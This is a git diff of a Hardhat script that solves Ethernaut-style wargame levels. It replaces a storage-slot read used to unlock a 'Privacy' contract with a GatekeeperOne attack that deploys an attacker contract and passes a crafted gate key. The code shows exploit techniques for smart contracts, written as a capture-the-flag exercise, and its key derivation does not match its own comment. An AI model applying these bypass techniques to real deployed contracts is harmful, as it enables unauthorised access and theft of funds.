@@ -1,21 +1,27 @@
 import { ethers } from "hardhat";
 
 const CONTRACT_NAME = "GatekeeperOne";
-const CONTRACT_ADDRESS = "0xCa876B0Af7E5C608dC40027541d1E526a6f4E14f";
+const CONTRACT_ADDRESS = "0x0dB688d0E1Cc5BbB14336A52b9ed5e7E848EA50A";
+const ATTACKER_CONTRACT_NAME = "GatekeeperOneAttacker";
 
 async function hack() {
   const factory = await ethers.getContractFactory(CONTRACT_NAME);
   const contract = factory.attach(CONTRACT_ADDRESS);
 
-  //hack storage
-  const storageValue = await ethers.provider?.getStorageAt(CONTRACT_ADDRESS, 5);
-  const castToBytes16 = storageValue.slice(0, 16 * 2 + 2);
-  console.log(castToBytes16);
+  //deploy attacker contract
+  const attackerFactory = await ethers.getContractFactory(
+    ATTACKER_CONTRACT_NAME
+  );
+  const attackerContract = await attackerFactory.deploy(contract.address);
 
-  const txAttack = await contract.unlock(castToBytes16);
-  await txAttack.wait();
+  //hack
+  const inputHack = contract.address.slice(0, 6) + "000000000000";
 
-  if (!(await contract.locked())) console.log("🚀 Contract hacked");
+  const txHack = await attackerContract.attack(inputHack);
+  await txHack.wait();
+
+  const entrant = await contract.entrant();
+  if (entrant === contract.address) console.log("🚀 Contract hacked");
   else console.log("❌ Contract not hacked");
 }
 
@@ -24,5 +30,5 @@ hack().catch((error) => {
   process.exitCode = 1;
 });
 
-//set une chaine hexadecimal de longueur 16+2 (0x) dont les 4 premiers sont non null
+// set une chaine hexadecimal de longueur 16+2 (0x) dont les 4 premiers sont non null
 // exemple 0xa2B3000000000000 que l'on détermine en gardant les 4+2 premiers caractères de tx.origine
